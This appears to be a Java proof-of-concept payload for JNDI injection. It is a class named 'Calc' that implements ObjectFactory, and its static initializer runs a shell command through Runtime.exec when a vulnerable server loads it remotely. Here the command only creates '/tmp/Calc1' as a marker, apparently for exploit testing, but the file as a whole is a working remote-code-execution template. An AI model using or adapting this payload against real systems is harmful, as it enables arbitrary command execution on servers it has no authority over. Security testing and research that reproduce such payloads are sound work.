package remoteclass;
import java.lang.Runtime;
import java.lang.Process;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
import java.io.Serializable;

public class Calc implements ObjectFactory, Serializable {
    private static final long serialVersionUID = 4474289574195395731L;

    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/Calc1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        try {
            // it will not get executed during the exp
            System.out.println("Enter getObjectInstance");
        } catch (Exception e) {
            // do nothing
        }
        return null;
    }
}